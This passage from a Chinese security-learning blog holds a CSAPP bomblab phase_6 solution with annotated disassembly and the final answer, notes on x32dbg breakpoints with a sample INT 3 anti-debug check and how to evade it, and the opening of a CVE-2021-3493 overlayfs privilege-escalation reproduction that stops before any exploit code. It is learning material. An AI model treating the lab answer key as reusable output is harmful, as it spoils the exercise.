class="code"><pre><span class="line">0x00000000004010f4 &lt;+0&gt;:push   r14</span><br><span class="line">0x00000000004010f6 &lt;+2&gt;:push   r13</span><br><span class="line">0x00000000004010f8 &lt;+4&gt;:push   r12</span><br><span class="line">0x00000000004010fa &lt;+6&gt;:push   rbp</span><br><span class="line">0x00000000004010fb &lt;+7&gt;:push   rbx</span><br><span class="line">0x00000000004010fc &lt;+8&gt;:sub    rsp,0x50</span><br><span class="line">0x0000000000401100 &lt;+12&gt;:mov    r13,rsp</span><br><span class="line">0x0000000000401103 &lt;+15&gt;:mov    rsi,rsp</span><br><span class="line">0x0000000000401106 &lt;+18&gt;:call   0x40145c &lt;read_six_numbers&gt;</span><br></pre></td></tr></table></figure><p>这一部分是读入六个整数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">0x000000000040110b &lt;+23&gt;:mov    r14,rsp</span><br><span class="line">0x000000000040110e &lt;+26&gt;:mov    r12d,0x0</span><br><span class="line">0x0000000000401114 &lt;+32&gt;:mov    rbp,r13    ;let rbp=r13</span><br><span class="line">0x0000000000401117 &lt;+35&gt;:mov    eax,DWORD PTR [r13+0x0]</span><br><span class="line">0x000000000040111b &lt;+39&gt;:sub    eax,0x1</span><br><span class="line">0x000000000040111e &lt;+42&gt;:cmp    eax,0x5</span><br><span class="line">0x0000000000401121 &lt;+45&gt;:jbe    0x401128 &lt;phase_6+52&gt;</span><br><span class="line">0x0000000000401123 &lt;+47&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">0x0000000000401128 &lt;+52&gt;:add    r12d,0x1</span><br><span class="line">0x000000000040112c &lt;+56&gt;:cmp    r12d,0x6</span><br><span class="line">0x0000000000401130 &lt;+60&gt;:je     0x401153 &lt;phase_6+95&gt; ;exit loop</span><br><span class="line">0x0000000000401132 &lt;+62&gt;:mov    ebx,r12d</span><br><span class="line">0x0000000000401135 &lt;+65&gt;:movsxd rax,ebx</span><br><span class="line">0x0000000000401138 &lt;+68&gt;:mov    eax,DWORD PTR [rsp+rax*4]    ;get number one by one</span><br><span class="line">0x000000000040113b &lt;+71&gt;:cmp    DWORD PTR [rbp+0x0],eax    ;must be not equal</span><br><span class="line">0x000000000040113e &lt;+74&gt;:jne    0x401145 &lt;phase_6+81&gt;</span><br><span class="line">0x0000000000401140 &lt;+76&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">0x0000000000401145 &lt;+81&gt;:add    ebx,0x1</span><br><span class="line">0x0000000000401148 &lt;+84&gt;:cmp    ebx,0x5</span><br><span class="line">0x000000000040114b &lt;+87&gt;:jle    0x401135 &lt;phase_6+65&gt;</span><br><span class="line">0x000000000040114d &lt;+89&gt;:add    r13,0x4    ;r13 += 4</span><br><span class="line">0x0000000000401151 &lt;+93&gt;:jmp    0x401114 &lt;phase_6+32&gt;</span><br><span class="line">0x0000000000401153 &lt;+95&gt;:lea    rsi,[rsp+0x18]</span><br></pre></td></tr></table></figure><p>后面这里就是取出第一个值，然后判断减一之后要小于等于 5。</p><p>中间的一个循环感觉是要判断我们输入的数两两不一样。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000401153 &lt;+95&gt;:lea    rsi,[rsp+0x18]</span><br><span class="line">0x0000000000401158 &lt;+100&gt;:mov    rax,r14</span><br><span class="line">0x000000000040115b &lt;+103&gt;:mov    ecx,0x7</span><br><span class="line">0x0000000000401160 &lt;+108&gt;:mov    edx,ecx</span><br><span class="line">0x0000000000401162 &lt;+110&gt;:sub    edx,DWORD PTR [rax]</span><br><span class="line">0x0000000000401164 &lt;+112&gt;:mov    DWORD PTR [rax],edx</span><br><span class="line">0x0000000000401166 &lt;+114&gt;:add    rax,0x4</span><br><span class="line">0x000000000040116a &lt;+118&gt;:cmp    rax,rsi</span><br><span class="line">0x000000000040116d &lt;+121&gt;:jne    0x401160 &lt;phase_6+108&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这一段逻辑应该就是 遍历所有的数，然后让那些数等于 7-value[i]。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">0x000000000040116f &lt;+123&gt;:mov    esi,0x0</span><br><span class="line">0x0000000000401174 &lt;+128&gt;:jmp    0x401197 &lt;phase_6+163&gt;   </span><br><span class="line">0x0000000000401176 &lt;+130&gt;:mov    rdx,QWORD PTR [rdx+0x8]</span><br><span class="line">0x000000000040117a &lt;+134&gt;:add    eax,0x1</span><br><span class="line">0x000000000040117d &lt;+137&gt;:cmp    eax,ecx</span><br><span class="line">0x000000000040117f &lt;+139&gt;:jne    0x401176 &lt;phase_6+130&gt; ;循环，类似取链表操作。</span><br><span class="line">0x0000000000401181 &lt;+141&gt;:jmp    0x401188 &lt;phase_6+148&gt;</span><br><span class="line">0x0000000000401183 &lt;+143&gt;:mov    edx,0x6032d0</span><br><span class="line">0x0000000000401188 &lt;+148&gt;:mov    QWORD PTR [rsp+rsi*2+0x20],rdx</span><br><span class="line">0x000000000040118d &lt;+153&gt;:add    rsi,0x4</span><br><span class="line">0x0000000000401191 &lt;+157&gt;:cmp    rsi,0x18</span><br><span class="line">0x0000000000401195 &lt;+161&gt;:je     0x4011ab &lt;phase_6+183&gt;    ;exit loop</span><br><span class="line">0x0000000000401197 &lt;+163&gt;:mov    ecx,DWORD PTR [rsp+rsi*1]    ;获取循环次数</span><br><span class="line">0x000000000040119a &lt;+166&gt;:cmp    ecx,0x1</span><br><span class="line">0x000000000040119d &lt;+169&gt;:jle    0x401183 &lt;phase_6+143&gt;</span><br><span class="line">0x000000000040119f &lt;+171&gt;:mov    eax,0x1</span><br><span class="line">0x00000000004011a4 &lt;+176&gt;:mov    edx,0x6032d0   ;get basic address</span><br><span class="line">0x00000000004011a9 &lt;+181&gt;:jmp    0x401176 &lt;phase_6+130&gt;   ;goto get link list</span><br><span class="line">0x00000000004011ab &lt;+183&gt;:mov    rbx,QWORD PTR [rsp+0x20]</span><br><span class="line">0x00000000004011b0 &lt;+188&gt;:lea    rax,[rsp+0x28]</span><br><span class="line">0x00000000004011b5 &lt;+193&gt;:lea    rsi,[rsp+0x50]</span><br><span class="line">0x00000000004011ba &lt;+198&gt;:mov    rcx,rbx</span><br><span class="line">0x00000000004011bd &lt;+201&gt;:mov    rdx,QWORD PTR [rax]</span><br><span class="line">0x00000000004011c0 &lt;+204&gt;:mov    QWORD PTR [rcx+0x8],rdx</span><br><span class="line">0x00000000004011c4 &lt;+208&gt;:add    rax,0x8</span><br><span class="line">0x00000000004011c8 &lt;+212&gt;:cmp    rax,rsi</span><br><span class="line">0x00000000004011cb &lt;+215&gt;:je     0x4011d2 &lt;phase_6+222&gt;    ;exit loop</span><br><span class="line">0x00000000004011cd &lt;+217&gt;:mov    rcx,rdx</span><br><span class="line">0x00000000004011d0 &lt;+220&gt;:jmp    0x4011bd &lt;phase_6+201&gt; ; loop</span><br><span class="line">0x00000000004011d2 &lt;+222&gt;:mov    QWORD PTR [rdx+0x8],0x0</span><br><span class="line">0x00000000004011da &lt;+230&gt;:mov    ebp,0x5</span><br><span class="line">0x00000000004011df &lt;+235&gt;:mov    rax,QWORD PTR [rbx+0x8]</span><br><span class="line">0x00000000004011e3 &lt;+239&gt;:mov    eax,DWORD PTR [rax]</span><br><span class="line">0x00000000004011e5 &lt;+241&gt;:cmp    DWORD PTR [rbx],eax</span><br><span class="line">0x00000000004011e7 &lt;+243&gt;:jge    0x4011ee &lt;phase_6+250&gt;</span><br><span class="line">0x00000000004011e9 &lt;+245&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">0x00000000004011ee &lt;+250&gt;:mov    rbx,QWORD PTR [rbx+0x8]</span><br><span class="line">0x00000000004011f2 &lt;+254&gt;:sub    ebp,0x1</span><br><span class="line">0x00000000004011f5 &lt;+257&gt;:jne    0x4011df &lt;phase_6+235&gt;</span><br><span class="line">0x00000000004011f7 &lt;+259&gt;:add    rsp,0x50</span><br><span class="line">0x00000000004011fb &lt;+263&gt;:pop    rbx</span><br><span class="line">0x00000000004011fc &lt;+264&gt;:pop    rbp</span><br><span class="line">0x00000000004011fd &lt;+265&gt;:pop    r12</span><br><span class="line">0x00000000004011ff &lt;+267&gt;:pop    r13</span><br><span class="line">0x0000000000401201 &lt;+269&gt;:pop    r14</span><br><span class="line">0x0000000000401203 &lt;+271&gt;:ret    </span><br></pre></td></tr></table></figure><p>它这里链表有一个基址，我们从基址这里开始，看看里面的 value。</p><p><img src="/2022/09/22/CSAPP_3/19.png"></p><p>他应该是按照我们输入的一个数字，然后取出链表对应深度的值，放到栈后面，然后比较是否严格 &gt;=，如果有一个小于就不行。我们在 +222 处下好一个断点，然后 1 2 3 4 5 6 输入看看。</p><p><img src="/2022/09/22/CSAPP_3/18.png"></p><p>可以发现，这里的 0x1bb 就是链表最后一个值，因为我们输入 1，然后用 7 减去得到了 6，所以第一个值就是最后一个值，我们先调整一下它自己的一个大小，排个序。下标排序为  2 1 6 5 4 3，再拿 7 减去得到 5 6 1 2 3 4。</p><p>但是输入发现还是爆炸了，动调，发现它要降序，后面的要大于等于前面的，但是因为前面判断不能重复，所以我们降序，倒一下顺序就可以实现了。</p><p>4 3 2 1 6 5</p><p><img src="/2022/09/22/CSAPP_3/21.png"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>phase_1：学习了 if 选择结构的汇编代码，并学会逆向分析选择结构的代码。</p><p>phase_2：学习了循环结构的汇编代码，并学会逆向分析循环结构的代码。</p><p>phase_3：学习了 switch 分发器的汇编代码，并用跳转表实现了其结构。</p><p>phase_4：学习了递归结构的汇编代码，并学会其逆向分析的方式。</p><p>phase_5：学习了基本逆向工程的写法，基本的字符串转变算法，了解了如何破解一个注册机程序。</p><p>phase_6：学习了链表的数据结构，结合数据结构合理地推测程序逻辑。</p><h2 id="CSAPP-attacklab"><a href="#CSAPP-attacklab" class="headerlink" title="CSAPP:attacklab"></a>CSAPP:attacklab</h2><p>待更新</p><h2 id="CSAPP-bufferlab"><a href="#CSAPP-bufferlab" class="headerlink" title="CSAPP:bufferlab"></a>CSAPP:bufferlab</h2><p>待更新</p>]]></content>
      
      
      <categories>
          
          <category> csapp </category>
          
          <category> 程序的机器级表示 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>《加密与解密》的学习</title>
      <link href="/2022/09/14/KanxueBook/"/>
      <url>/2022/09/14/KanxueBook/</url>
      
        <content type="html"><![CDATA[<p>最近好迷茫，所以又斥巨资买了一本充满力量的书，那就是看雪的《加密与解密》，也来彻底地玩一玩逆向吧。</p><span id="more"></span><h2 id="Windows操作系统"><a href="#Windows操作系统" class="headerlink" title="Windows操作系统"></a>Windows操作系统</h2><p>曾经的我，认为 <code>Linux</code> 天下第一好用，（虽然现在我也那么认为）但是 <code>windows </code>作为受众很广的操作系统，很多 <code>windows</code> 的程序也是有必要去学习一下的。</p><h3 id="win32API"><a href="#win32API" class="headerlink" title="win32API"></a>win32API</h3><p>当今大部分 <code>windows</code> 程序都是 <code>GUI</code>，<code>GUI</code> 是通过一系列 <code>API</code> 来完成的，具体<a href="KanxueBook/win32.chm">帮助手册</a>自行下载。</p><p>我们只需要知道一部分的，并且用到什么就学什么好了，比如常见的从控件中获取输入值，用接口 <code>GetDlgItemTextA</code>，弹窗反馈 <code>MessageBoxA</code>，当然这是比较常见的，具体调试的时候还得具体情况具体分析。</p><p><code>windows</code> 程序运行比较依赖动态链接库(dll)，可以理解为 <code>Linux</code> 下的 <code>.so</code> 文件。<code>windows</code>比较内核的三个动态链接库为</p><ul><li><code>kernel(kernel32.dll)</code>：提供操作系统的核心服务。</li><li><code>user(user32.dll)</code>：提供用户输入和输出的接口。</li><li><code>GDI(GDI32.dll)</code>：提供图形设备接口。</li></ul><p>这里需要注意一点，就是很多接口的后缀 <code>A</code> 或者 <code>W</code> 表示它处理字符的一个字符集， <code>A</code> 表示 <code>ASCII</code> 码，<code>w</code> 表示 <code>unicode</code> 码。</p><h2 id="动态调试器"><a href="#动态调试器" class="headerlink" title="动态调试器"></a>动态调试器</h2><p>这本书介绍了很多的动态调试器，这里我还是比较喜欢 <code>x32dbg</code>，所以其它的我也不一一解读了，但是相同的特性也能拿来讲一讲记一记。</p><h3 id="直接调试"><a href="#直接调试" class="headerlink" title="直接调试"></a>直接调试</h3><p>打开调试器，在<strong>文件</strong> <code>-&gt;</code> <strong>打开</strong> 中选择自己要调试的文件，然后载入。</p><h3 id="附加调试"><a href="#附加调试" class="headerlink" title="附加调试"></a>附加调试</h3><p>打开调试器，在<strong>文件</strong> <code>-&gt;</code> <strong>附加</strong> 中选择自己要附加调试的进程，然后载入。</p><hr><p>感觉附加调试会好一点吧，毕竟能先让程序运行到自己想调试的点然后再去调试，这样省了前面入口点的一些操作，但是我们要调试关键信息，一定是要下<strong>断点</strong>(<strong>break point</strong>)的。</p><p>这里我们直接用 <code>chap02\OllyDbg调试器\2.1.4 基本操作\bin\ASCII版\TraceMe.exe</code> 来试试手。</p><p><img src="/2022/09/14/KanxueBook/1.png" alt="1"></p><p>调试器整体呈这样，最上面一行肯定是标签栏，工具栏，选项卡。剩余窗口大致分为四块。<code>CPU</code> 选项卡中的窗口表现出来就是代码窗口，最右边的窗口时寄存器窗口，左下角的窗口是内存窗口，右下角的窗口是栈窗口，最下面一行的文本框可以用于打命令使用。</p><h3 id="CPU窗口"><a href="#CPU窗口" class="headerlink" title="CPU窗口"></a>CPU窗口</h3><p>大概分了五列，如下图所示。</p><p><img src="/2022/09/14/KanxueBook/2.png" alt="2"></p><ul><li>对于第一列，更多的是标识跳转的作用，以及设置断点。</li><li>第二列标识了当前内存地址的地址，<strong>双击</strong>可以显示改行的相对地址偏移，再次双击恢复。</li><li>第三列标识了该地址的内存字节，<strong>双击</strong>可以下断点。</li><li>第四列标识了该字节码的反汇编代码，选中使用 <strong>空格</strong> 键可以修改汇编代码。</li><li>第五列提供了一些内存地址或者是寄存器的值，也可以用 <code>;</code> 键去添加注释。</li></ul><h3 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h3><p>断点大致分为以下几种类型</p><ul><li><code>INT 3</code> 断点</li><li>硬件断点</li><li>内存断点</li><li>消息断点</li><li>条件断点</li></ul><h4 id="INT-3断点"><a href="#INT-3断点" class="headerlink" title="INT 3断点"></a>INT 3断点</h4><p><code>INT 3</code> 是一条汇编指令，其机器码是 <code>0xCC</code> 所以也叫 <code>CC</code> 指令。执行这个指令的时候，会抛出一个 <code>break point exception</code> 异常，这个异常会被调试器捕获到，因此能达到断点的目的。在打断点的时候，会把这个地址设置为 <code>0xCC</code> ，也就是 <code>INT 3</code>  的机器码。优点是可以设置很多个断点，因为我们只要想，可以在任意地址把值改成 <code>0xCC</code> 以此达到断点的目的。但是带来的缺点就是会修改程序的内存，改变了原机器码，可能会被程序检测到。</p><p>比如这样的一个 <code>MFC</code> 程序，<a href="KanxueBook/TrackMe.exe">附件下载</a></p><p>source:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CTrackMeDlg::OnBnClickedButton1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">HWND hWnd = <span class="built_in">AfxGetMainWnd</span>()-&gt;m_hWnd;</span><br><span class="line">QWORD Uaddr;</span><br><span class="line">BYTE Mark = <span class="number">0</span>;</span><br><span class="line">Uaddr = (QWORD)MessageBoxA;</span><br><span class="line">Mark = *(BYTE*)Uaddr;</span><br><span class="line"><span class="keyword">if</span> (Mark == <span class="number">0xCC</span>) &#123;</span><br><span class="line"><span class="built_in">MessageBoxA</span>(hWnd, <span class="string">&quot;be tracked&quot;</span>, <span class="string">&quot;MessageBox&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">MessageBoxA</span>(hWnd,<span class="string">&quot;Very OK&quot;</span>,<span class="string">&quot;MessageBox&quot;</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/09/14/KanxueBook/3.png" alt="3"></p><p>正常运行结果如图所示</p><p><img src="/2022/09/14/KanxueBook/4.png" alt="4"></p><p>如果放到调试器，对 <code>MessageBoxA</code> 这个函数下断点的话，那么就会导致出现另一个不同的运行结果。</p><p><img src="/2022/09/14/KanxueBook/5.png" alt="5"></p><p>因为我们断点设置在 <code>MessageBoxA</code> 上，而程序判断了 <code>MessageBoxA</code> 调用地址是否为 <code>INT 3</code> 指令(<code>0xCC</code>)，有的话就直接输出 <code>be tracked</code> 说明检测到这里下了 <code>INT 3</code> 断点。</p><p>如果我们要绕过检测同时又要求能断下来，那么我们可以在函数调用中间或者是末尾下 <code>INT 3</code> 断点。</p><h4 id="硬件断点"><a href="#硬件断点" class="headerlink" title="硬件断点"></a>硬件断点</h4><p>硬件断点主要是通过 <code>DRx</code> 寄存器实现的，<code>DR0~DR3</code> 分别用于保存硬件断点的地址，那我们也可以看出来它最多能同时存在四个硬件断点。<code>DR4-DR5</code> 未公开具体作用， <code>DR6</code> 用于保存寄存器组状态， <code>DR7</code> 用于保存寄存器组控制。硬件断点不会改变程序字节码，因此它更难被检测，在断点选项中可以设置硬件执行断点，同样，对于一般内存来说，我们可以设置硬件访问断点。</p><p>设置完成之后我们在寄存器窗口拉到最下面，可以看到 <code>DR</code> 寄存器，我们可以从前四个寄存器中找到我们下的硬件断点的位置。硬件断点的优势劣势与前面的 <code>INT 3</code> 断点相对，硬件断点不能同时大量设置，但是它不会更改进程代码段的内存。</p><h4 id="内存断点"><a href="#内存断点" class="headerlink" title="内存断点"></a>内存断点</h4><p>内存（读/写/执行）断点是通过将某一块内存页标记为对应的不可（读/写/执行），当程序尝试对该内存（读/写/执行）的时候就会抛出异常，转而给调试器进行异常处理，若发现访问内存刚好是断点位置时，程序断住，否则正常进行（读/写/执行）操作。由于在执行的时候，会有一个读取命令的操作，因此我们如果在代码断设置了内存访问断点，执行到指定位置时同样会被断住。</p><p>比如这个程序，我们在某一条指令上下内存读取断点</p><p><img src="/2022/09/14/KanxueBook/6.png" alt="6"></p><p>我们再次按 <code>F9</code> 继续执行可以发现程序停在了我们下的断点位置。</p><p><img src="/2022/09/14/KanxueBook/7.png" alt="7"></p><p>不知为何在经过一番激烈的讨论之后，认定  <code>x32dbg</code> 应该是这里的技术细节没有实现，所以导致它只能在一个内存页设置，不能保证在指定位置断住，因此在一个内存页中可能多次被这个点断住，因为它可能没有比较访存位置与内存断点位置。</p><p>内存断点分持久的和一次性断点，一次性断点在断住之后即被删除。</p><h4 id="消息断点"><a href="#消息断点" class="headerlink" title="消息断点"></a>消息断点</h4><p>略</p><h4 id="条件断点"><a href="#条件断点" class="headerlink" title="条件断点"></a>条件断点</h4><p>我们如果希望在一个地方满足一定条件才断下来，这个时候我们可以 <code>shift+F2</code> 设置条件断点，比如我想在一个 <code>10000</code> 次的循环当中，看第 <code>5000</code> 次的执行结果，那么我们正常操作就是给循环体一个断点，然后 <code>F9</code> <code>5000</code> 次，显然这么做会很麻烦，那么我们可以设置一个条件，让它在指定条件才断住，加入循环变量存储在 <code>rcx</code> 当中，那么我们可以设置 <code>rcx==5000</code>。</p><p>source:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">10000</span>;i++)&#123;</span><br><span class="line">sum+=i;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,sum);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/09/14/KanxueBook/8.png" alt="8"></p><p>我们可以很清晰看到这里的循环结构，然后我们看到循环变量存在 <code>ebx</code> 寄存器中，我们在循环体中下一个条件断点，观察程序的运行。</p><p><img src="/2022/09/14/KanxueBook/9.png" alt="9"></p><p>然后发现程序成功在我们指定的条件下面断住了。</p><p><img src="/2022/09/14/KanxueBook/10.png" alt="10"></p><h3 id="静态调试"><a href="#静态调试" class="headerlink" title="静态调试"></a>静态调试</h3><p>待更</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> reverse </category>
          
          <category> kxbook </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-3493复现</title>
      <link href="/2022/08/31/CVE-2021-3493/"/>
      <url>/2022/08/31/CVE-2021-3493/</url>
      
        <content type="html"><![CDATA[<p>来复现一下这次的CVE-2021-3493</p><span id="more"></span><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>该漏洞是通过创建一个虚拟环境，在虚拟环境当中通过某软件赋予某文件高权限，由于程序检查不严密，该权限逃逸到现实环境中也生效。</p><h2 id="前置芝士"><a href="#前置芝士" class="headerlink" title="前置芝士"></a>前置芝士</h2><p><code>overlayfs</code> ：虚拟的，堆叠文件系统</p><p><code>capability</code>：权限管理机制</p><p><code>namespace</code>：一种命名空间</p><h3 id="overlayfs"><a href="#overlayfs" class="headerlink" title="overlayfs"></a>overlayfs</h3><p>能把多个文件夹里的文件合并为到同一个文件夹当中，这么听起来这个文件系统好像挺鸡肋的，但是它支持了一个我们最喜欢用的软件：docker。docker里面分容器和镜像的概念，一个镜像可以派生出多个容器，跟虚拟机差不多，一个镜像可以创建多个虚拟机。容器分公有数据和私有数据，docker比虚拟机优势的一点就是docker中的公有数据所有容器共享，这样就能省磁盘空间，私有数据则可以各个容器独占，保证数据独立。docker的实现机制就是通过 <code>overlayfs</code> 文件系统实现的。</p><p><code>overlayfs</code> 依赖并建立在其它的文件系统之上（例如ext4fs和xfs等等），并不直接参与磁盘空间结构的划分，仅仅将原来底层文件系统中不同的目录进行“合并”，然后向用户呈现。</p><p><img src="/2022/08/31/CVE-2021-3493/1.png" alt="1"></p><p>其中lower dirA / lower dirB目录和upper dir目录为来自底层文件系统的不同目录，用户可以自行指定，内部包含了用户想要合并的文件和目录，merge dir目录为挂载点。当文件系统挂载后，在merge目录下将会同时看到来自各lower和upper目录下的内容，并且用户也无法（无需）感知这些文件分别哪些来自lower dir，哪些来自upper dir，用户看见的只是一个普通的文件系统根目录而已（lower dir可以有多个也可以只有一个）。</p><h4 id="overlayfs挂载"><a href="#overlayfs挂载" class="headerlink" title="overlayfs挂载"></a><code>overlayfs</code>挂载</h4><p>挂载一个overlay文件系统，可以通过mount -t overlay -o <options> overlay <mount point>来实现。</mount></options></p><p><mount point>是最终overlay的挂载点。</mount></p><p>其中overlay的options有如下：</p><ul><li>lower dir=<dir>：指定用户需要挂载的lower层目录，lower层支持多个目录，用“:”间隔，优先级依次降低。最多支持500层。</dir></li><li>upper dir=<dir>：指定用户需要挂载的upper层目录，upper层优先级高于所有的lower层目录。</dir></li><li>work dir=<dir>：指定文件系统挂载后用于存放临时和间接文件的工作基础目录。</dir></li></ul><p>下面将lower和upper进行overlay，挂载到merge目录，临时workdir为work目录。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$mount -t overlay -o lowerdir=lower,upperdir=upper,workdir=work overlay merge</span><br></pre></td></tr></table></figure><p> 如下同样将lower和upper进行overlay到merge，但是merge为只读属性。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$mount -t overlay -o lowerdir=upper:lower overlay merge</span><br></pre></td></tr></table></figure><p>在使用如上mount进行<code>overlayfs</code>合并之后，遵循如下规则：</p><ol><li><code>lower dir</code>和<code>upper dir</code>两个目录存在同名文件时，<code>lower dir</code>的文件将会被隐藏，用户只能看到<code>upper dir</code>的文件。</li><li><code>lower dir</code>低优先级的同目录同名文件将会被隐藏。</li><li>如果存在同名目录，那么<code>lower dir</code>和<code>upper dir</code>目录中的内容将会合并。</li><li>当用户修改<code>merge dir</code>中来自<code>upper dir</code>的数据时，数据将直接写入<code>upper dir</code>中原来目录中，删除文件也同理。</li><li>当用户修改<code>merge dir</code>中来自<code>lower dir</code>的数据时，<code>lower dir</code>中内容均不会发生任何改变。因为<code>lower dir</code>是只读的，用户想修改来自<code>lower dir</code>数据时，<code>overlayfs</code>会首先拷贝一份<code>lower dir</code>中文件副本到<code>upper dir</code>中。后续修改或删除将会在<code>upper dir</code>下的副本中进行，<code>lower dir</code>中原文件将会被隐藏。</li></ol><h4 id="docker如何使用overlayfs"><a href="#docker如何使用overlayfs" class="headerlink" title="docker如何使用overlayfs"></a>docker如何使用overlayfs</h4><p>在docker当中，我们为了方便理解，假设只有三个目录：<code>upper dir</code>,<code>lower dir</code>和<code>merge dir</code>。我们的镜像处于<code>lower dir</code>当中，初始情况下，我们通过镜像创建出来一个容器，<code>lower dir</code> 中就是一个镜像，<code>upper dir</code> 中为空，我们创建多个容器得到的都是和镜像一模一样的系统。当我尝试查看容器中的某个文件，根据规则1，因为 <code>upper dir</code> 为空，我们看的的内容是 <code>lower dir</code> 中的内容，也就是镜像的内容；当我尝试修改容器中的文件内容时，根据规则5，<code>lower dir</code> 中的内容只读，因此拷贝一份到 <code>upper dir</code> 中，根据规则1，我们之后将只能看到该文件 <code>upper dir</code> 中的内容，修改完成会将结果保存在 <code>upper dir</code> 当中，之后再次修改这个文件，将只在<code>upper dir</code> 当中进行。但是在我们的视角当中，我们跟操作一个完整的操作系统并没有很大的区别。并且多个容器大部分数据是共享的，因此比较节省磁盘空间。</p><h4 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h4><p>我们新建四个文件夹：<code>upper</code>，<code>lower </code>，<code>work</code> 和 <code>merge</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$mount -t overlay overlay -o lowerdir=./lower,upperdir=./upper,workdir=./work ./merge</span><br></pre></td></tr></table></figure><p><code>mount</code> 命令用于挂载操作，第一个 <code>overlay</code> 指定挂载类型为 <code>overlay</code> 第二个 <code>overlay</code> 指定挂载点，<code>-o</code> 选项指定上层目录，下层目录，工作目录，最后挂载到 <code>merge</code> 目录下。</p><p>挂载完成之后我们在 <code>lower</code> 和 <code>upper</code> 中分别创建 <code>1.txt</code> 和 <code>2.txt</code>。我们使用 <code>ls -lR</code> 来查看目录</p><p><img src="/2022/08/31/CVE-2021-3493/2.png" alt="2"></p><p>我们可以发现， <code>merge</code> 目录中也出现了 <code>1.txt</code> 和 <code>2.txt</code>。</p><p>我们修改 <code>upper</code> 和 <code>lower</code> 中文件对应的内容，可以发现，<code>merge</code> 目录中也会有相同的改变，这非常符合 <code>overlayfs</code> 的规则。</p><p>我们尝试直接在 <code>merge</code> 目录中修改在 <code>upper</code> 目录中出现的文件再观察一下变化。</p><p><img 